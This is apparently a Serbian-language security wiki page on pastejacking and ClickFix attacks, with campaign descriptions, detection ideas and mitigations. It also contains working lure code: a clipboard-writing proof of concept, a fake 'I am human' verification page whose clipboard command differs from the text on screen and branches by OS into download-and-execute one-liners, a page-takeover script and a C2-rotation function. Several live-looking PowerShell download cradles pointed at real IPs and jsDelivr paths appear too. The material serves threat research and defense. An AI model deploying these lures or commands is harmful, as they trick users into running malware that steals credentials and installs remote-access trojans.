# Clipboard Hijacking (Pastejacking) Napadi

{{#include ../../banners/hacktricks-training.md}}

> "Nikad ne lepi ništa što nisi lično kopirao." – staro, ali i dalje važeći savet

## Pregled

Clipboard hijacking – takođe poznat kao *pastejacking* – zloupotrebljava činjenicu da korisnici rutinski kopiraju i lepe komande bez njihovog pregleda. Zlonamerni web sajt (ili bilo koji JavaScript-sposobni kontekst kao što su Electron ili desktop aplikacija) programski smešta tekst kojim upravlja napadač u sistemski clipboard. Žrtve se obično podstiču, pažljivo osmišljenim social-engineering uputstvima, da pritisnu **Win + R** (Run dialog), **Win + X** (Quick Access / PowerShell), ili otvore terminal i *paste* sadržaj iz clipboard-a, čime se odmah izvršavaju proizvoljne komande.

Pošto **se nijedan fajl ne preuzima i nijedan attachment ne otvara**, tehnika zaobilazi većinu bezbednosnih kontrola e-pošte i web-sadržaja koje prate priloge, makroe ili direktno izvršavanje komandi. Napad je zbog toga popularan u phishing kampanjama koje distribuiraju commodity malware porodice kao što su NetSupport RAT, Latrodectus loader ili Lumma Stealer.

## Primorana upotreba "Copy" dugmeta i skriveni payloadi (macOS one-liners)

Neki macOS infostealers kloniraju sajtove instalera (npr. Homebrew) i **primoravaju korišćenje dugmeta “Copy”** tako da korisnici ne mogu označiti samo vidljivi tekst. Unos u clipboard sadrži očekivanu installer komandu plus dodatni Base64 payload (npr. `...; echo <b64> | base64 -d | sh`), tako da jednim lepljenjem izvrše oba koraka dok UI skriva dodatnu fazu.

## JavaScript Proof-of-Concept
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
Starije kampanje su koristile `document.execCommand('copy')`, novije se oslanjaju na asinhroni **Clipboard API** (`navigator.clipboard.writeText`).

## ClickFix / ClearFake tok

1. Korisnik posećuje typosquatted ili kompromitovan sajt (npr. `docusign.sa[.]com`)
2. Injektovani **ClearFake** JavaScript poziva helper `unsecuredCopyToClipboard()` koji neprimetno smešta Base64-encoded PowerShell one-liner u clipboard.
3. HTML uputstvo kaže žrtvi: *“Pritisnite **Win + R**, nalepite komandu i pritisnite Enter da rešite problem.”*
4. `powershell.exe` se izvršava, preuzimajući arhivu koja sadrži legitimni izvršni fajl plus maliciozni DLL (klasični DLL sideloading).
5. Loader dekriptuje dodatne faze, injektuje shellcode i instalira persistenciju (npr. scheduled task) – na kraju pokrećući NetSupport RAT / Latrodectus / Lumma Stealer.

### Primer lanca NetSupport RAT
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* `jp2launcher.exe` (legitiman Java WebStart) pretražuje svoj direktorijum tražeći `msvcp140.dll`.
* Maliciozni DLL dinamički rešava API-je pomoću **GetProcAddress**, preuzima dva binarna fajla (`data_3.bin`, `data_4.bin`) preko **curl.exe**, dešifruje ih koristeći rolling XOR key `"https://google.com/"`, injektuje konačni shellcode i raspakuje **client32.exe** (NetSupport RAT) u `C:\ProgramData\SecurityCheck_v1\`.

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. Preuzima `la.txt` pomoću **curl.exe**
2. Izvršava JScript downloader unutar **cscript.exe**
3. Preuzima MSI payload → drops `libcef.dll` pored potpisane aplikacije → DLL sideloading → shellcode → Latrodectus.

### Lumma Stealer via MSHTA
```
mshta https://iplogger.co/xxxx =+\\xxx
```
The **mshta** call launches a hidden PowerShell script that retrieves `PartyContinued.exe`, extracts `Boat.pst` (CAB), reconstructs `AutoIt3.exe` through `extrac32` & file concatenation and finally runs an `.a3x` script which exfiltrates browser credentials to `sumeriavgv.digital`.

## ClickFix: Clipboard → PowerShell → JS eval → Startup LNK with rotating C2 (PureHVNC)

Neke ClickFix kampanje potpuno preskaču preuzimanje fajlova i navode žrtve da nalepi one‑liner koji preuzima i izvršava JavaScript preko WSH, persists ga i rotira C2 dnevno. Primer posmatranog lanca:
```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```
Ključne osobine
- Obfuscated URL obrnuti u runtime-u da bi se izbegla površinska inspekcija.
- JavaScript samostalno se održava putem Startup LNK (WScript/CScript), i bira C2 prema trenutnom danu – omogućavajući brzu domain rotation.

Minimalni JS fragment korišćen za rotaciju C2s po datumu:
```js
function getURL() {
var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
var current_datetime = new Date().getTime();
var no_days = getDaysDiff(0, current_datetime);
return 'https://'
+ getListElement(C2_domain_list, no_days)
+ '/Y/?t=' + current_datetime
+ '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```
U sledećoj fazi obično se koristi loader koji uspostavlja persistenciju i preuzima RAT (npr. PureHVNC), često pinujući TLS na hardkodovani sertifikat i deleći saobraćaj na segmente.

Detection ideas specific to this variant
- Stablo procesa: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (ili `cscript.exe`).
- Artefakti pri pokretanju: LNK u `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` koji poziva WScript/CScript sa JS putem pod `%TEMP%`/`%APPDATA%`.
- Registry/RunMRU i command‑line telemetrija koja sadrže `.split('').reverse().join('')` ili `eval(a.responseText)`.
- Ponavljani `powershell -NoProfile -NonInteractive -Command -` sa velikim stdin payload-ovima da bi se nahranili dugački skriptovi bez dugih command line-ova.
- Scheduled Tasks koji potom izvršavaju LOLBins kao što je `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"` pod updater‑izgledajućim task-om/putanjom (npr. `\GoogleSystem\GoogleUpdater`).

Threat hunting
- Daily‑rotating C2 hostnames i URL-ovi sa obrascem `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>`.
- Korelacija clipboard write događaja praćenog Win+R paste pa neposrednim izvršenjem `powershell.exe`.

Blue-teams mogu kombinovati clipboard, process-creation i registry telemetriju da precizno identifikuju zloupotrebu pastejacking-a:

* Windows Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` čuva istoriju **Win + R** komandi – proverite neobične Base64 / obfuskovane unose.
* Security Event ID **4688** (Process Creation) gde je `ParentImage` == `explorer.exe` i `NewProcessName` u { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` }.
* Event ID **4663** za kreiranja fajlova pod `%LocalAppData%\Microsoft\Windows\WinX\` ili privremenim folderima odmah pre sumnjivog 4688 događaja.
* EDR clipboard senzori (ako postoje) – korelirajte `Clipboard Write` odmah praćen novim PowerShell procesom.

## IUAM-style verification pages (ClickFix Generator): clipboard copy-to-console + OS-aware payloads

Nedavne kampanje masovno proizvode lažne CDN/browser verifikacione stranice ("Just a moment…", IUAM-style) koje prisiljavaju korisnike da kopiraju OS-specifične komande iz clipboard-a u native konzole. Ovo premesta izvršavanje iz browser sandbox-a i funkcioniše na Windows i macOS.

Ključne osobine stranica generisanih od strane builder-a
- Detekcija OS preko `navigator.userAgent` radi prilagođavanja payload-a (Windows PowerShell/CMD vs. macOS Terminal). Opcionalni mamci/no-opovi za nepodržane OS da održe iluziju.
- Automatsko kopiranje u clipboard na benignim UI akcijama (checkbox/Copy) dok se vidljivi tekst može razlikovati od sadržaja clipboard-a.
- Blokiranje mobilnih uređaja i popover sa korak‑po‑korak uputstvima: Windows → Win+R→paste→Enter; macOS → open Terminal→paste→Enter.
- Opcionalna obfuskacija i single-file injector za prepisivanje DOM-a kompromitovanog sajta Tailwind-stilizovanim verification UI-em (nije potrebna registracija novog domena).

Primer: clipboard mismatch + grananje zavisno od OS-a
```html
<div class="space-y-2">
<label class="inline-flex items-center space-x-2">
<input id="chk" type="checkbox" class="accent-blue-600"> <span>I am human</span>
</label>
<div id="tip" class="text-xs text-gray-500">If the copy fails, click the checkbox again.</div>
</div>
<script>
const ua = navigator.userAgent;
const isWin = ua.includes('Windows');
const isMac = /Mac|Macintosh|Mac OS X/.test(ua);
const psWin = `powershell -nop -w hidden -c "iwr -useb https://example[.]com/cv.bat|iex"`;
const shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;
const shown = 'copy this: echo ok';            // benign-looking string on screen
const real = isWin ? psWin : (isMac ? shMac : 'echo ok');

function copyReal() {
// UI shows a harmless string, but clipboard gets the real command
navigator.clipboard.writeText(real).then(()=>{
document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';
});
}

document.getElementById('chk').addEventListener('click', copyReal);
</script>
```
macOS perzistencija inicijalnog pokretanja
- Koristite `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &` tako da izvršavanje nastavi nakon zatvaranja terminala, smanjujući vidljive artefakte.

In-place page takeover na kompromitovanim sajtovima
```html
<script>
(async () => {
const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();
document.documentElement.innerHTML = html;                 // overwrite DOM
const s = document.createElement('script');
s.src = 'https://cdn.tailwindcss.com';                     // apply Tailwind styles
document.head.appendChild(s);
})();
</script>
```
Ideje za detection & hunting specifične za IUAM-style lures
- Web: Stranice koje povezuju Clipboard API sa verification widgetima; neusaglašenost između prikazanog teksta i clipboard payload; `navigator.userAgent` grananje; Tailwind + single-page replace u sumnjivim kontekstima.
- Windows endpoint: `explorer.exe` → `powershell.exe`/`cmd.exe` uskoro nakon interakcije sa browserom; batch/MSI instalateri izvršeni iz `%TEMP%`.
- macOS endpoint: Terminal/iTerm koji pokreću `bash`/`curl`/`base64 -d` sa `nohup` u blizini browser događaja; pozadinski procesi koji prežive zatvaranje terminala.
- Korelacija `RunMRU` Win+R istorije i clipboard zapisa sa naknadnim kreiranjem konzolnih procesa.

See also for supporting techniques

{{#ref}}
clone-a-website.md
{{#endref}}

{{#ref}}
homograph-attacks.md
{{#endref}}

## 2026 fake CAPTCHA / ClickFix evolucije (ClearFake, Scarlet Goldfinch)

- ClearFake nastavlja da kompromituje WordPress sajtove i injektuje loader JavaScript koji kaskadira eksterne hostove (Cloudflare Workers, GitHub/jsDelivr) i čak blockchain “etherhiding” pozive (npr. POSTs ka Binance Smart Chain API endpointima kao `bsc-testnet.drpc[.]org`) da povuče trenutnu lure logic. Nedavni overlayi intenzivno koriste fake CAPTCHAs koje upute korisnike da copy/paste-uju one-liner (T1204.004) umesto da nešto preuzimaju.
- Početna egzekucija se sve više delegira na signed script hosts/LOLBAS. Lancima iz januara 2026 je zamenjena ranija upotreba `mshta` ugrađenim `SyncAppvPublishingServer.vbs` koji se izvršava preko `WScript.exe`, prosleđujući PowerShell-like argumente sa aliasima/wildcards da preuzme remote sadržaj:
```cmd
"C:\WINDOWS\System32\WScript.exe" "C:\WINDOWS\system32\SyncAppvPublishingServer.vbs" "n;&(gal i*x)(&(gcm *stM*) 'cdn.jsdelivr[.]net/gh/grading-chatter-dock73/vigilant-bucket-gui/p1lot')"
```
- `SyncAppvPublishingServer.vbs` je potpisan i obično ga koristi App-V; uparen sa `WScript.exe` i neobičnim argumentima (`gal`/`gcm` aliases, wildcarded cmdlets, jsDelivr URLs) postaje high-signal LOLBAS stage za ClearFake.
- fake CAPTCHA payloads iz februara 2026 su se vratili na čiste PowerShell download cradles. Dva živa primera:
```powershell
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -c iex(irm 158.94.209[.]33 -UseBasicParsing)
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -w h -c "$w=New-Object -ComObject WinHttp.WinHttpRequest.5.1;$w.Open('GET','https[:]//cdn[.]jsdelivr[.]net/gh/www1day7/msdn/fase32',0);$w.Send();$f=$env:TEMP+'\FVL.ps1';$w.ResponseText>$f;powershell -w h -ep bypass -f $f"
```
- Prvi lanac je in-memory `iex(irm ...)` grabber; drugi pravi stage preko `WinHttp.WinHttpRequest.5.1`, zapisuje privremeni `.ps1`, pa zatim pokreće sa `-ep bypass` u skrivenom prozoru.

Detection/hunting tips for these variants
- Procesna linija: browser → `explorer.exe` → `wscript.exe ...SyncAppvPublishingServer.vbs` ili PowerShell cradles odmah nakon clipboard writes/Win+R.
- Ključne reči u komandnoj liniji: `SyncAppvPublishingServer.vbs`, `WinHttp.WinHttpRequest.5.1`, `-UseBasicParsing`, `%TEMP%\FVL.ps1`, jsDelivr/GitHub/Cloudflare Worker domains, ili raw IP `iex(irm ...)` patterns.
- Mreža: outbound ka CDN worker hostovima ili blockchain RPC endpointima sa script hosts/PowerShell-a ubrzo nakon web pregledanja.
- Fajl/registry: kreiranje privremenog `.ps1` pod `%TEMP%` plus RunMRU unosi koji sadrže ove one-linere; blokirajte/alertujte na signed-script LOLBAS (WScript/cscript/mshta) koji se izvršavaju sa external URLs ili obfuscated alias stringovima.

## Mitigations

1. Browser hardening – onemogućite clipboard write-access (`dom.events.asyncClipboard.clipboardItem` etc.) ili zahtevajte korisničku gestu.
2. Security awareness – naučite korisnike da *ukucaju* osetljive komande ili da ih prvo zalepе u tekst editor.
3. PowerShell Constrained Language Mode / Execution Policy + Application Control za blokiranje proizvoljnih one-linera.
4. Network controls – blokirajte outbound zahteve ka poznatim pastejacking i malware C2 domenima.

## Related Tricks

* **Discord Invite Hijacking** često zloupotrebljava isti ClickFix pristup nakon što ubedi korisnike da uđu u zlonamerni server:

{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## References

- [Fix the Click: Preventing the ClickFix Attack Vector](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [The ClickFix Factory: First Exposure of IUAM ClickFix Generator](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)
- [2025, the year of the Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [Red Canary – Intelligence Insights: February 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-february-2026/)

{{#include ../../banners/hacktricks-training.md}}
